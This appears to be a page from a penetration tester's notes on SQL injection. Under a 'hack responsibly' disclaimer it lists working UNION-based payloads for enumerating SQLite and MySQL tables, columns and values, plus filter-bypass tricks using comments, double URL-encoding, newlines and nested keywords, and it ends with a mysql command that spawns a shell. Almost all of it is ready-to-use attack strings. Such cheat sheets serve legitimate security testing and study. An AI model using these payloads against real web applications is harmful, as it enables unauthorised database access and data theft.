# SQL

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

## SQLi - SQL Injection

[SQL Injection Cheatsheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

Blind SQL injection UNIoN queries: [Ippsec:HacktheBox - Charon](https://www.youtube.com/watch?v=_csbKuOlmdE) use `CONCAT("x","x")`

### SQL Injection Tips

`--` -&gt; Comments in Linux  
`--+` -&gt; Comments in Windows  
`%23 (#)` -&gt; Hash Symbol  
`%2527 (')` -&gt; to bypass urldecode\(urldecode\(htmlspecialchars\(, ENT\_QUOTES\)\)\);

### Manual UNION SQLite Injection

_Table_

```sql
1' union all select 1,tbl_name,3 FROM sqlite_master WHERE type='table' limit 0,1 --
```

_Columns \(as command\)_

```sql
1' union all select 1,sql,3 FROM sqlite_master WHERE type='table' and tbl_name='nameoftable' limit 0,1 --
```

_Values \(payload depends on the columns structure\)_

```sql
1' union all select 1,"nameofcolumn",3 FROM "nameoftable" limit 2,1 --
```

### Manual UNION SQL Injection

_Table_

```sql
1' union select (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),2#
```

_Columns_

```sql
1' union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='nameoftable'),2#
```

_Values_

```sql
1' union select (select nameofcolumn from nameoftable limit 0,1),2#
```

_Using Newline_

```sql
admin %0A union %0A select %0A 1,database()#
           or
admin %0A union %0A select %0A database(),2#
```

_Bypass preg\_replace_

```sql
ununionion select 1,2%23
     or
UNunionION SEselectLECT 1,2,3%23
```

## Misc



get shell in mysql: `\! /bin/sh`



